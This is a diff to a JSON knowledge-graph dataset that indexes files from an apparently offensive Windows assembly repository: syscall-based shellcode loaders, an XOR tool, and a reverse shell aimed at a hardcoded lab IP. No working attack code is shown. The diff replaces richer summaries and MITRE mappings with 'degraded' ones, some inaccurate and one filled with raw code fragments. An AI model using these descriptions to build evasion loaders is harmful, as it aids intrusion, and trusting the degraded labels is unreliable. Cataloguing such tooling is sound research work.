@@ -3,13 +3,13 @@
   "ownerAuthorization": "All included material and brand assets are provided and authorized by the repository owner.",
   "sourceHash": "b9ecb3fdb504a0506f55fcf5c04abf53dc1bb5ef68cbd6770a4d87d5e8395bad",
   "rawCounts": {
-    "nodes": 5493,
-    "relations": 3860
+    "nodes": 5471,
+    "relations": 3831
   },
   "quality": {
     "states": {
       "core": 1898,
-      "support": 339,
+      "support": 317,
       "evidence": 3256,
       "quarantined": 190
     },
@@ -115269,62 +115269,28 @@
       "sourceHash": "9a29725cf8c815743f5e9262307dc2fc6740ec6feecfa995863a3c1d01fd8530",
       "label": "indirect.asm",
       "name": "indirect.asm",
-      "summary": "The assembly code implements indirect system calls for memory operations using external references.",
-      "description": "The assembly code implements indirect system calls for memory operations using external references.",
+      "summary": "The assembly code defines functions for allocating, writing, and protecting virtual memory using NT system calls.",
+      "description": "The assembly code defines functions for allocating, writing, and protecting virtual memory using NT system calls.",
       "category": "asm",
       "topic": "dataset_record",
       "tags": [
         "dataset_record",
         "asm",
         "assembly",
-        "system calls",
-        "memory management"
+        "syscall",
+        "virtual memory",
+        "nt",
+        "x64",
+        "memory protection",
+        "indirect syscall"
       ],
       "mitre": [],
       "mitre_candidates": [],
       "confidence": 0.95,
       "galaxyId": "sources",
       "code_artifact": null,
-      "enrichment_status": "complete",
-      "enrichment_model": "openai/gpt-4o"
-    },
-    {
-      "id": "concept:ed32971712c531a7969f4b",
-      "type": "concept",
-      "publishState": "support",
-      "evidenceId": "SYN-54FD0B94F5A0",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "2aa623085471f17f",
-      "label": "Indirect System Calls",
-      "name": "Indirect System Calls",
-      "summary": "A method of invoking system calls indirectly through predefined system call numbers and addresses.",
-      "description": "A method of invoking system calls indirectly through predefined system call numbers and addresses.",
-      "category": "cpp",
-      "topic": "concept",
-      "tags": [
-        "concept",
-        "cpp"
-      ],
-      "confidence": 0.9
-    },
-    {
-      "id": "technique:b89a5a432e8926483eb88c",
-      "type": "technique",
-      "publishState": "support",
-      "evidenceId": "SYN-16D369B644FA",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "2ca24bcc91ad215f",
-      "label": "Indirect System Call Execution",
-      "name": "Indirect System Call Execution",
-      "summary": "The code uses indirect system calls to perform memory operations and execute a payload.",
-      "description": "The code uses indirect system calls to perform memory operations and execute a payload.",
-      "category": "execution",
-      "topic": "execution",
-      "tags": [
-        "technique",
-        "cpp"
-      ],
-      "confidence": 0.8
+      "enrichment_status": "degraded",
+      "enrichment_model": "onnx-community/gemma-4-E2B-it-ONNX"
     },
     {
       "id": "source:bef414c9b57c6df7512c22",
@@ -115335,24 +115301,28 @@
       "sourceHash": "333f4de36d89ed53707dd0f05321800f788731d4711f1df44e7d8f15cdc4a06a",
       "label": "main.cpp",
       "name": "main.cpp",
-      "summary": "The C++ code utilizes indirect system calls for memory operations and payload execution.",
-      "description": "The C++ code utilizes indirect system calls for memory operations and payload execution.",
+      "summary": "The C++ code demonstrates indirect system call invocation using functions like NtAllocateVirtualMemory and NtWriteVirtualMemory.",
+      "description": "The C++ code demonstrates indirect system call invocation using functions like NtAllocateVirtualMemory and NtWriteVirtualMemory.",
       "category": "cpp",
       "topic": "dataset_record",
       "tags": [
         "dataset_record",
         "cpp",
         "C++",
-        "system calls",
-        "memory management"
+        "WindowsAPI",
+        "Syscall",
+        "NtDll",
+        "VirtualMemory",
+        "Exploit",
+        "IndirectSyscall"
       ],
       "mitre": [],
       "mitre_candidates": [],
       "confidence": 0.95,
       "galaxyId": "sources",
       "code_artifact": null,
-      "enrichment_status": "complete",
-      "enrichment_model": "openai/gpt-4o"
+      "enrichment_status": "degraded",
+      "enrichment_model": "onnx-community/gemma-4-E2B-it-ONNX"
     },
     {
       "id": "source:3def7075e3e7d6af5673bf",
@@ -115363,24 +115333,21 @@
       "sourceHash": "64738ebc0650f71aab3497612c7a0451318a67907faaf5e6b3727cf0d1e94dd6",
       "label": "main.cpp",
       "name": "main.cpp",
-      "summary": "The code demonstrates dynamic resolution and invocation of system calls.",
-      "description": "The code demonstrates dynamic resolution and invocation of system calls.",
+      "summary": "#include <Windows.h> #pragma comment(lib, \"ntdll\") #define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1) EXTERN_C NTSTATUS NtAllocateVirtualMemory( HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect ); EXTERN_C NTSTATUS NtProtectVirtualMemory( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, IN ULONG NewProtect, OUT PULONG Ol",
+      "description": "#include <Windows.h> #pragma comment(lib, \"ntdll\") #define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1) EXTERN_C NTSTATUS NtAllocateVirtualMemory( HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect ); EXTERN_C NTSTATUS NtProtectVirtualMemory( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, IN ULONG NewProtect, OUT PULONG Ol",
       "category": "cpp",
       "topic": "dataset_record",
       "tags": [
         "dataset_record",
-        "cpp",
-        "dynamic resolution",
-        "system calls",
-        "code execution"
+        "cpp"
       ],
       "mitre": [],
       "mitre_candidates": [],
       "confidence": 0.95,
       "galaxyId": "sources",
       "code_artifact": null,
-      "enrichment_status": "complete",
-      "enrichment_model": "openai/gpt-4o"
+      "enrichment_status": "degraded",
+      "enrichment_model": null
     },
     {
       "id": "source:f6915c769e71eee7b97604",
@@ -115391,24 +115358,28 @@
       "sourceHash": "afea2841edfec88246a869a2456457836608cd2ca1d5ccf602abbc56b38ba7b8",
       "label": "ntapi.asm",
       "name": "ntapi.asm",
-      "summary": "The script obfuscates system call usage to bypass security mechanisms.",
-      "description": "The script obfuscates system call usage to bypass security mechanisms.",
+      "summary": "This is an assembly implementation demonstrating calls to NtAllocateVirtualMemory, NtWriteVirtualMemory, and NtProtectVirtualMemory.",
+      "description": "This is an assembly implementation demonstrating calls to NtAllocateVirtualMemory, NtWriteVirtualMemory, and NtProtectVirtualMemory.",
       "category": "asm",
       "topic": "dataset_record",
       "tags": [
         "dataset_record",
         "asm",
-        "obfuscation",
-        "system calls",
-        "security evasion"
+        "assembly",
+        "ntapi",
+        "virtualmemory",
+        "systemcall",
+        "memorymanagement",
+        "kernel32",
+        "lowlevelprogramming"
       ],
       "mitre": [],
       "mitre_candidates": [],
       "confidence": 0.95,
       "galaxyId": "sources",
       "code_artifact": null,
-      "enrichment_status": "complete",
-      "enrichment_model": "openai/gpt-4o"
+      "enrichment_status": "degraded",
+      "enrichment_model": "onnx-community/gemma-4-E2B-it-ONNX"
     },
     {
       "id": "source:4951842f8a341cc4156168",
@@ -115419,62 +115390,26 @@
       "sourceHash": "ca2cb84ff6b9302cfd638c9151f3164135711af59efaae156d5343d60af9dd7d",
       "label": "main.cpp",
       "name": "main.cpp",
-      "summary": "The C++ code calls a function to create a reverse connection to a remote host.",
-      "description": "The C++ code calls a function to create a reverse connection to a remote host.",
+      "summary": "The C++ program calls a function named RevConnect with hardcoded IP address \"192.168.186.130\" and port 445.",
+      "description": "The C++ program calls a function named RevConnect with hardcoded IP address \"192.168.186.130\" and port 445.",
       "category": "cpp",
       "topic": "dataset_record",
       "tags": [
         "dataset_record",
         "cpp",
         "C++",
-        "networking",
-        "reverse connection"
+        "Winsock2",
+        "Socket Programming",
+        "Network",
+        "Windows API"
       ],
       "mitre": [],
       "mitre_candidates": [],
       "confidence": 0.95,
       "galaxyId": "sources",
       "code_artifact": null,
-      "enrichment_status": "complete",
-      "enrichment_model": "openai/gpt-4o"
-    },
-    {
-      "id": "concept:7861357dc405c65c4001e1",
-      "type": "concept",
-      "publishState": "support",
-      "evidenceId": "SYN-2314BA3EB7BD",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "ed0b3cd074180cdf",
-      "label": "Reverse Connection",
-      "name": "Reverse Connection",
-      "summary": "A method of establishing a reverse connection to a remote host.",
-      "description": "A method of establishing a reverse connection to a remote host.",
-      "category": "cpp",
-      "topic": "concept",
-      "tags": [
-        "concept",
-        "cpp"
-      ],
-      "confidence": 0.9
-    },
-    {
-      "id": "technique:f3af89f8d41b9499995f78",
-      "type": "technique",
-      "publishState": "support",
-      "evidenceId": "SYN-2816FBAACEC3",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "2461125548ef25dc",
-      "label": "Reverse Connection Establishment",
-      "name": "Reverse Connection Establishment",
-      "summary": "The code establishes a reverse connection to a remote host.",
-      "description": "The code establishes a reverse connection to a remote host.",
-      "category": "c2",
-      "topic": "c2",
-      "tags": [
-        "technique",
-        "cpp"
-      ],
-      "confidence": 0.8
+      "enrichment_status": "degraded",
+      "enrichment_model": "onnx-community/gemma-4-E2B-it-ONNX"
     },
     {
       "id": "source:c168bd90f593bdb86a0d5a",
@@ -115485,24 +115420,29 @@
       "sourceHash": "9335964b52861a9348fb4e311aac5152ce353cece89bb7d213ea9576d1572cc9",
       "label": "rev.asm",
       "name": "rev.asm",
-      "summary": "The script executes shellcode in a remote process using a custom loader.",
-      "description": "The script executes shellcode in a remote process using a custom loader.",
+      "summary": "This assembly code defines a procedure to initialize Winsock, create a socket, connect to a server, and then create a new process.",
+      "description": "This assembly code defines a procedure to initialize Winsock, create a socket, connect to a server, and then create a new process.",
       "category": "asm",
       "topic": "dataset_record",
       "tags": [
         "dataset_record",
         "asm",
-        "shellcode",
-        "remote execution",
-        "process injection"
+        "assembly",
+        "winsock",
+        "socket",
+        "win32",
+        "process_creation",
+        "networking",
+        "api",
+        "cruntime"
       ],
       "mitre": [],
       "mitre_candidates": [],
       "confidence": 0.95,
       "galaxyId": "sources",
       "code_artifact": null,
-      "enrichment_status": "complete",
-      "enrichment_model": "openai/gpt-4o"
+      "enrichment_status": "degraded",
+      "enrichment_model": "onnx-community/gemma-4-E2B-it-ONNX"
     },
     {
       "id": "source:578f0653567fea44abd73d",
@@ -115513,100 +115453,28 @@
       "sourceHash": "bda93d3f2c99520de937641700bc8a368cd932b326b4cb7f3938e634f989f3f6",
       "label": "alloc.asm",
       "name": "alloc.asm",
-      "summary": "The assembly code demonstrates memory management and execution techniques using Windows API functions.",
-      "description": "The assembly code demonstrates memory management and execution techniques using Windows API functions.",
+      "summary": "The assembly code demonstrates functions for memory allocation, moving data, and changing memory protection.",
+      "description": "The assembly code demonstrates functions for memory allocation, moving data, and changing memory protection.",
       "category": "asm",
       "topic": "dataset_record",
       "tags": [
         "dataset_record",
         "asm",
         "assembly",
-        "memory_management",
-        "windows_api"
+        "memory management",
+        "VirtualAlloc",
+        "RtlMoveMemory",
+        "VirtualProtect",
+        "x86",
+        "memory allocation"
       ],
       "mitre": [],
       "mitre_candidates": [],
       "confidence": 0.95,
       "galaxyId": "sources",
       "code_artifact": null,
-      "enrichment_status": "complete",
-      "enrichment_model": "openai/gpt-4o"
-    },
-    {
-      "id": "concept:2e36a0544dd37262a43501",
-      "type": "concept",
-      "publishState": "support",
-      "evidenceId": "SYN-A47DDFDC8FA9",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "8ebb662c02593f86",
-      "label": "VirtualAlloc",
-      "name": "VirtualAlloc",
-      "summary": "A Windows API function for memory allocation.",
-      "description": "A Windows API function for memory allocation.",
-      "category": "asm",
-      "topic": "concept",
-      "tags": [
-        "concept",
-        "asm"
-      ],
-      "confidence": 0.9
-    },
-    {
-      "id": "concept:44d6d188153458c5805fc2",
-      "type": "concept",
-      "publishState": "support",
-      "evidenceId": "SYN-34CA960A81CC",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "83f862c0c36465ef",
-      "label": "RtlMoveMemory",
-      "name": "RtlMoveMemory",
-      "summary": "A Windows API function for memory copying.",
-      "description": "A Windows API function for memory copying.",
-      "category": "asm",
-      "topic": "concept",
-      "tags": [
-        "concept",
-        "asm"
-      ],
-      "confidence": 0.9
-    },
-    {
-      "id": "concept:c31158beb7d51159d0a637",
-      "type": "concept",
-      "publishState": "support",
-      "evidenceId": "SYN-BEBBF68DDF11",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "64d048b63ede9e64",
-      "label": "VirtualProtect",
-      "name": "VirtualProtect",
-      "summary": "A Windows API function for changing memory protection.",
-      "description": "A Windows API function for changing memory protection.",
-      "category": "asm",
-      "topic": "concept",
-      "tags": [
-        "concept",
-        "asm"
-      ],
-      "confidence": 0.9
-    },
-    {
-      "id": "technique:b4050f6a5254e804df5bc9",
-      "type": "technique",
-      "publishState": "support",
-      "evidenceId": "SYN-22BFD5C0955F",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "7ae5f43c3e169073",
-      "label": "Memory Allocation and Execution",
-      "name": "Memory Allocation and Execution",
-      "summary": "Allocating memory with specific permissions and executing code within it.",
-      "description": "Allocating memory with specific permissions and executing code within it.",
-      "category": "execution",
-      "topic": "execution",
-      "tags": [
-        "technique",
-        "asm"
-      ],
-      "confidence": 0.9
+      "enrichment_status": "degraded",
+      "enrichment_model": "onnx-community/gemma-4-E2B-it-ONNX"
     },
     {
       "id": "source:da84ab5dc563d46e3edfb7",
@@ -115617,61 +115485,28 @@
       "sourceHash": "41c8718f1c253b63639551c3bf4191990d2280af027c3f2a0a96e94edece385d",
       "label": "main.cpp",
       "name": "main.cpp",
-      "summary": "The C++ code integrates an external assembly function to execute a payload in memory.",
-      "description": "The C++ code integrates an external assembly function to execute a payload in memory.",
+      "summary": "The C function Allocate is implemented in main.cpp and calls a sequence of x86 assembly instructions as a payload.",
+      "description": "The C function Allocate is implemented in main.cpp and calls a sequence of x86 assembly instructions as a payload.",
       "category": "cpp",
       "topic": "dataset_record",
       "tags": [
         "dataset_record",
         "cpp",
-        "memory_execution",
-        "payload"
+        "C",
+        "assembly",
+        "exploit",
+        "shellcode",
+        "main.cpp",
+        "Allocate",
+        "x86"
       ],
       "mitre": [],
       "mitre_candidates": [],
       "confidence": 0.95,
       "galaxyId": "sources",
       "code_artifact": null,
-      "enrichment_status": "complete",
-      "enrichment_model": "openai/gpt-4o"
-    },
-    {
-      "id": "concept:496018fecb3d63107c5965",
-      "type": "concept",
-      "publishState": "support",
-      "evidenceId": "SYN-A2AF3D578BE5",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "89a1489b4a4c63fe",
-      "label": "Memory Execution",
-      "name": "Memory Execution",
-      "summary": "A method to execute code stored in memory.",
-      "description": "A method to execute code stored in memory.",
-      "category": "cpp",
-      "topic": "concept",
-      "tags": [
-        "concept",
-        "cpp"
-      ],
-      "confidence": 0.9
-    },
-    {
-      "id": "technique:496018fecb3d63107c5965",
-      "type": "technique",
-      "publishState": "support",
-      "evidenceId": "SYN-A9804456F773",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "89a1489b4a4c63fe",
-      "label": "Memory Execution",
-      "name": "Memory Execution",
-      "summary": "Executing code stored in memory through an external function.",
-      "description": "Executing code stored in memory through an external function.",
-      "category": "execution",
-      "topic": "execution",
-      "tags": [
-        "technique",
-        "cpp"
-      ],
-      "confidence": 0.9
+      "enrichment_status": "degraded",
+      "enrichment_model": "onnx-community/gemma-4-E2B-it-ONNX"
     },
     {
       "id": "source:2b4e9844e8b33987159cfe",
@@ -115682,99 +115517,29 @@
       "sourceHash": "71f45779209300c45e1454a245c16239d049da3ad8d64e3de457429a8e5c49c7",
       "label": "main.cpp",
       "name": "main.cpp",
-      "summary": "The C++ code utilizes Windows API functions for advanced memory operations.",
-      "description": "The C++ code utilizes Windows API functions for advanced memory operations.",
+      "summary": "The C++ code demonstrates calling native Windows NTDLL functions like NtAllocateVirtualMemory, NtWriteVirtualMemory, and NtProtectVirtualMemory via exported functions.",
+      "description": "The C++ code demonstrates calling native Windows NTDLL functions like NtAllocateVirtualMemory, NtWriteVirtualMemory, and NtProtectVirtualMemory via exported functions.",
       "category": "cpp",
       "topic": "dataset_record",
       "tags": [
         "dataset_record",
         "cpp",
-        "windows_api",
-        "memory_management"
+        "C++",
+        "Windows API",
+        "NTDLL",
+        "Syscalls",
+        "VirtualMemory",
+        "Exploit",
+        "PInvoke",
+        "MemoryManipulation"
       ],
       "mitre": [],
       "mitre_candidates": [],
       "confidence": 0.95,
       "galaxyId": "sources",
       "code_artifact": null,
-      "enrichment_status": "complete",
-      "enrichment_model": "openai/gpt-4o"
-    },
-    {
-      "id": "concept:272449e09f1edfba17e604",
-      "type": "concept",
-      "publishState": "support",
-      "evidenceId": "SYN-3B160C660774",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "a5aead029ddcda33",
-      "label": "NtAllocateVirtualMemory",
-      "name": "NtAllocateVirtualMemory",
-      "summary": "A system call for memory allocation.",
-      "description": "A system call for memory allocation.",
-      "category": "asm",
-      "topic": "concept",
-      "tags": [
-        "concept",
-        "asm"
-      ],
-      "confidence": 0.9
-    },
-    {
-      "id": "concept:d926eda4be4c1eaf263e4f",
-      "type": "concept",
-      "publishState": "support",
-      "evidenceId": "SYN-27D78300FA0D",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "5523f9df462deccb",
-      "label": "NtProtectVirtualMemory",
-      "name": "NtProtectVirtualMemory",
-      "summary": "A system call for changing memory protection.",
-      "description": "A system call for changing memory protection.",
-      "category": "asm",
-      "topic": "concept",
-      "tags": [
-        "concept",
-        "asm"
-      ],
-      "confidence": 0.9
-    },
-    {
-      "id": "concept:d9a163920d91e7e098502d",
-      "type": "concept",
-      "publishState": "support",
-      "evidenceId": "SYN-3C73F4E43865",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "4cc32a46da1c4ff3",
-      "label": "NtWriteVirtualMemory",
-      "name": "NtWriteVirtualMemory",
-      "summary": "A system call for writing to memory.",
-      "description": "A system call for writing to memory.",
-      "category": "asm",
-      "topic": "concept",
-      "tags": [
-        "concept",
-        "asm"
-      ],
-      "confidence": 0.9
-    },
-    {
-      "id": "technique:f6bb6a6d43b07f4783380c",
-      "type": "technique",
-      "publishState": "support",
-      "evidenceId": "SYN-7B031E777A43",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "f94fca1e12901e68",
-      "label": "Memory Management",
-      "name": "Memory Management",
-      "summary": "Allocating and managing memory using native Windows API functions.",
-      "description": "Allocating and managing memory using native Windows API functions.",
-      "category": "execution",
-      "topic": "execution",
-      "tags": [
-        "technique",
-        "cpp"
-      ],
-      "confidence": 0.9
+      "enrichment_status": "degraded",
+      "enrichment_model": "onnx-community/gemma-4-E2B-it-ONNX"
     },
     {
       "id": "source:fc45cf0d02ec691729957a",
@@ -115785,43 +115550,28 @@
       "sourceHash": "2268c72427810135d8f9cc218e85ee8f5d9c1256d0bed86534b854d71398c6ca",
       "label": "syscalls.asm",
       "name": "syscalls.asm",
-      "summary": "The assembly code implements system calls for memory operations.",
-      "description": "The assembly code implements system calls for memory operations.",
+      "summary": "The file contains x64 assembly code implementing system calls for virtual memory allocation, writing, and protection.",
+      "description": "The file contains x64 assembly code implementing system calls for virtual memory allocation, writing, and protection.",
       "category": "asm",
       "topic": "dataset_record",
       "tags": [
         "dataset_record",
         "asm",
         "assembly",
-        "system_calls",
-        "memory_management"
+        "syscalls",
+        "virtual memory",
+        "x64",
+        "ntdll",
+        "system call",
+        "memory manipulation"
       ],
       "mitre": [],
       "mitre_candidates": [],
       "confidence": 0.95,
       "galaxyId": "sources",
       "code_artifact": null,
-      "enrichment_status": "complete",
-      "enrichment_model": "openai/gpt-4o"
-    },
-    {
-      "id": "technique:1b570c45d3906a8b3c55ba",
-      "type": "technique",
-      "publishState": "support",
-      "evidenceId": "SYN-F0D304093055",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "5fc34a86ea2ccb73",
-      "label": "System Call Memory Management",
-      "name": "System Call Memory Management",
-      "summary": "Using system calls for memory allocation and execution.",
-      "description": "Using system calls for memory allocation and execution.",
-      "category": "execution",
-      "topic": "execution",
-      "tags": [
-        "technique",
-        "asm"
-      ],
-      "confidence": 0.9
+      "enrichment_status": "degraded",
+      "enrichment_model": "onnx-community/gemma-4-E2B-it-ONNX"
     },
     {
       "id": "source:85c72a8be5174c476cb803",
@@ -115832,61 +115582,25 @@
       "sourceHash": "cdf48eca15c3d2286d086d650cccb5d3cf10dde83acb72c629951b79215107e1",
       "label": "main.cpp",
       "name": "main.cpp",
-      "summary": "The C++ code uses an external assembly function for XOR-based encryption and decryption.",
-      "description": "The C++ code uses an external assembly function for XOR-based encryption and decryption.",
+      "summary": "The C++ program demonstrates XOR encryption and decryption on the string \"Hello\" using the key \"test\".",
+      "description": "The C++ program demonstrates XOR encryption and decryption on the string \"Hello\" using the key \"test\".",
       "category": "cpp",
       "topic": "dataset_record",
       "tags": [
         "dataset_record",
         "cpp",
+        "C++",
+        "XOR",
         "encryption",
-        "xor"
+        "string manipulation"
       ],
       "mitre": [],
       "mitre_candidates": [],
       "confidence": 0.95,
       "galaxyId": "sources",
       "code_artifact": null,
-      "enrichment_status": "complete",
-      "enrichment_model": "openai/gpt-4o"
-    },
-    {
-      "id": "concept:23b325dc2837ba82363c30",
-      "type": "concept",
-      "publishState": "support",
-      "evidenceId": "SYN-07407697BB14",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "656f6a8859c0db40",
-      "label": "XOR Encryption",
-      "name": "XOR Encryption",
-      "summary": "A method for encrypting and decrypting data using XOR operation.",
-      "description": "A method for encrypting and decrypting data using XOR operation.",
-      "category": "asm",
-      "topic": "concept",
-      "tags": [
-        "concept",
-        "asm"
-      ],
-      "confidence": 0.9
-    },
-    {
-      "id": "technique:23b325dc2837ba82363c30",
-      "type": "technique",
-      "publishState": "support",
-      "evidenceId": "SYN-94EBCE064B9A",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "656f6a8859c0db40",
-      "label": "XOR Encryption",
-      "name": "XOR Encryption",
-      "summary": "Encrypting and decrypting data using XOR operation.",
-      "description": "Encrypting and decrypting data using XOR operation.",
-      "category": "execution",
-      "topic": "execution",
-      "tags": [
-        "technique",
-        "asm"
-      ],
-      "confidence": 0.9
+      "enrichment_status": "degraded",
+      "enrichment_model": "onnx-community/gemma-4-E2B-it-ONNX"
     },
     {
       "id": "source:39cbdb4b4a246e712ac6fe",
@@ -115897,24 +115611,28 @@
       "sourceHash": "d46cf7a316a19bcd9c454fa24e68db54ed7c5a1490c11fde6c04881ed87ad1d3",
       "label": "xorit.asm",
       "name": "xorit.asm",
-      "summary": "The assembly code implements XOR-based encryption and decryption.",
-      "description": "The assembly code implements XOR-based encryption and decryption.",
+      "summary": "The record contains xorit.asm assembly code for a procedure that performs XOR operations on memory locations.",
+      "description": "The record contains xorit.asm assembly code for a procedure that performs XOR operations on memory locations.",
       "category": "asm",
       "topic": "dataset_record",
       "tags": [
         "dataset_record",
         "asm",
         "assembly",
-        "encryption",
-        "xor"
+        "xorit",
+        "xor",
+        "procedure",
+        "memory",
+        "low_level",
+        "cprogramming"
       ],
       "mitre": [],
       "mitre_candidates": [],
       "confidence": 0.95,
       "galaxyId": "sources",
       "code_artifact": null,
-      "enrichment_status": "complete",
-      "enrichment_model": "openai/gpt-4o"
+      "enrichment_status": "degraded",
+      "enrichment_model": "onnx-community/gemma-4-E2B-it-ONNX"
     },
     {
       "id": "source:86add4df83091a2fab4222",
@@ -115925,144 +115643,29 @@
       "sourceHash": "19d12e8fbb4122e2cc6b03c0a438512a6604982cec6f6a02233df8c27f9fbfce",
       "label": "README.md",
       "name": "README.md",
-      "summary": "Collection of offensive Windows x64 assembly programs, including multiple shellcode loaders, a basic XOR encryption tool, and a reverse shell using WinSock and CreateProcessA. Assembly functions are called from C in Visual Studio projects using MASM.",
-      "description": "Collection of offensive Windows x64 assembly programs, including multiple shellcode loaders, a basic XOR encryption tool, and a reverse shell using WinSock and CreateProcessA. Assembly functions are called from C in Visual Studio projects using MASM.",
+      "summary": "This dataset contains a collection of programs created while learning assembly, including various shellcode loaders and an XOR encryption program.",
+      "description": "This dataset contains a collection of programs created while learning assembly, including various shellcode loaders and an XOR encryption program.",
       "category": "md",
       "topic": "dataset_record",
       "tags": [
         "dataset_record",
         "md",
-        "Windows x64",
         "assembly",
-        "Source C",
-        "shellcode loader",
+        "shellcode",
+        "winapi",
         "reverse shell",
-        "XOR encryption",
-        "WinSock",
-        "CreateProcessA",
-        "MASM",
-        "Visual Studio"
+        "x86",
+        "masm",
+        "c",
+        "security"
       ],
       "mitre": [],
-      "mitre_candidates": [
-        {
-          "confidence": 0.9,
-          "evidence": [
-            "Win API shellcode loader",
-            "NtApi Shellcode loader",
-            "Syscalls Shellcode loader (with some code in C to resolve functions)",
-            "Indirect Syscalls Shellcode loader"
-          ],
-          "id": "T1055"
-        },
-        {
-          "confidence": 0.85,
-          "evidence": [
-            "Reverse Shell using WinSock and CreateProcessA"
-          ],
-          "id": "T1071"
-        }
-      ],
+      "mitre_candidates": [],
       "confidence": 0.95,
       "galaxyId": "sources",
       "code_artifact": null,
-      "enrichment_status": "complete",
-      "enrichment_model": "openai/gpt-4.1"
-    },
-    {
-      "id": "concept:b8057e07146fcfa598448c",
-      "type": "concept",
-      "publishState": "support",
-      "evidenceId": "SYN-9F0605C4D99C",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "c2485ff15dbedaf1",
-      "label": "Offensive Windows x64 Assembly Programs",
-      "name": "Offensive Windows x64 Assembly Programs",
-      "summary": "A set of programs designed for Source C tasks on Windows x64, focusing on assembly language and integration with C.",
-      "description": "A set of programs designed for Source C tasks on Windows x64, focusing on assembly language and integration with C.",
-      "category": "md",
-      "topic": "concept",
-      "tags": [
-        "concept",
-        "md"
-      ],
-      "confidence": 0.95
-    },
-    {
-      "id": "concept:66e410ddc02aa1db7160f6",
-      "type": "concept",
-      "publishState": "support",
-      "evidenceId": "SYN-94863D96AE96",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "9be052a640b7d776",
-      "label": "Assembly and C Integration",
-      "name": "Assembly and C Integration",
-      "summary": "The use of assembly functions called from C code, with MASM as a build dependency, to implement offensive techniques.",
-      "description": "The use of assembly functions called from C code, with MASM as a build dependency, to implement offensive techniques.",
-      "category": "md",
-      "topic": "concept",
-      "tags": [
-        "concept",
-        "md"
-      ],
-      "confidence": 0.9
-    },
-    {
-      "id": "technique:0ef452b667ebe0ff2732be",
-      "type": "technique",
-      "publishState": "support",
-      "evidenceId": "SYN-CC83DC8DBE1B",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "1988d75a2571dac8",
-      "label": "Shellcode Loading via Windows APIs and Syscalls",
-      "name": "Shellcode Loading via Windows APIs and Syscalls",
-      "summary": "Loading shellcode using various Windows APIs, including Win API, NtApi, Syscalls, and Indirect Syscalls.",
-      "description": "Loading shellcode using various Windows APIs, including Win API, NtApi, Syscalls, and Indirect Syscalls.",
-      "category": "execution",
-      "topic": "execution",
-      "tags": [
-        "technique",
-        "md"
-      ],
-      "confidence": 0.95
-    },
-    {
-      "id": "technique:c08748fd1f833da2f24ba1",
-      "type": "technique",
-      "publishState": "support",
-      "evidenceId": "SYN-A92641D962FF",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "5719e0e6766dc583",
-      "label": "Reverse Shell using WinSock and CreateProcessA",
-      "name": "Reverse Shell using WinSock and CreateProcessA",
-      "summary": "Implementing a reverse shell by leveraging WinSock for network communication and CreateProcessA for process creation.",
-      "description": "Implementing a reverse shell by leveraging WinSock for network communication and CreateProcessA for process creation.",
-      "category": "execution",
-      "topic": "execution",
-      "tags": [
-        "technique",
-        "md"
-      ],
-      "confidence": 0.9
-    },
-    {
-      "id": "technique:db6982f933bff779e1a13e",
-      "type": "technique",
-      "publishState": "support",
-      "evidenceId": "SYN-D8014B5C43B7",
-      "sourceClass": "model-inferred-grounded",
-      "sourceHash": "abb11091dd29804b",
-      "label": "Basic XOR Encryption",
-      "name": "Basic XOR Encryption",
-      "summary": "Encrypting data using a basic XOR encryption program.",
-      "description": "Encrypting data using a basic XOR encryption program.",
-      "category": "defense_evasion",
-      "topic": "defense_evasion",
-      "tags": [
-        "technique",
-        "md"
-      ],
-      "confidence": 0.85
+      "enrichment_status": "degraded",
+      "enrichment_model": "onnx-community/gemma-4-E2B-it-ONNX"
     }
   ],
   "edges": [
@@ -136623,238 +136226,6 @@
       "target": "T-022",
       "type": "reference",
       "weight": 0.85
-    },
-    {
-      "id": "ingest-edge:35ebf95a313d37f88cff50",
-      "source": "source:bb4faa95ea190a9b879b27",
-      "target": "concept:ed32971712c531a7969f4b",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "A method of invoking system calls indirectly through predefined system call numbers and addresses."
-    },
-    {
-      "id": "ingest-edge:5b3a01a640d7dbbf39a12f",
-      "source": "source:bb4faa95ea190a9b879b27",
-      "target": "technique:b89a5a432e8926483eb88c",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "The code uses indirect system calls to perform memory operations such as allocation, writing, and protection."
-    },
-    {
-      "id": "ingest-edge:8250cfc36e59dcbc3c6f84",
-      "source": "source:bef414c9b57c6df7512c22",
-      "target": "concept:ed32971712c531a7969f4b",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "A method of invoking system calls indirectly through predefined system call numbers and addresses."
-    },
-    {
-      "id": "ingest-edge:c7a3a00764fd930453bc9b",
-      "source": "source:bef414c9b57c6df7512c22",
-      "target": "technique:b89a5a432e8926483eb88c",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "The code uses indirect system calls to perform memory operations and execute a payload."
-    },
-    {
